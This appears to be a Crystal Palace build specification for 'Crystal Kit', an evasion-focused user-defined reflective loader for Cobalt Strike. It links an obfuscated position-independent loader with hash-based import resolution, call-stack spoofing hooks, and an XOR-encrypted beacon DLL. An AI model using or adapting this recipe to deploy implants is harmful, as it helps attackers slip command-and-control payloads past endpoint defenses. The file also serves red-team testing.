name     "Crystal Kit UDRL"
describe "Evasion Kit for Cobalt Strike"
author   "Daniel Duggan (@_RastaMouse)"

x64:
	load "bin/loader.x64.o"
		make pic +gofirst +optimize +disco +mutate
		dfr "resolve" "ror13"
		mergelib "../libtcg.x64.zip"
		mergelib "../libtp.x64.zip"
	
	load "bin/proxy.x64.o"
		make pic
		export
		preplen
		link "draugr"

	generate $KEY 128

	load "bin/hook.x64.o"
		make object +optimize +disco
		mergelib "../libtcg.x64.zip"
		patch "xorkey" $KEY
		import "LoadLibraryA, GetProcAddress, SpoofStub"
		export
		link "hooks"

	push $DLL
		xor $KEY
		preplen
		link "dll"

	push $KEY
		preplen
		link "key"
	
	export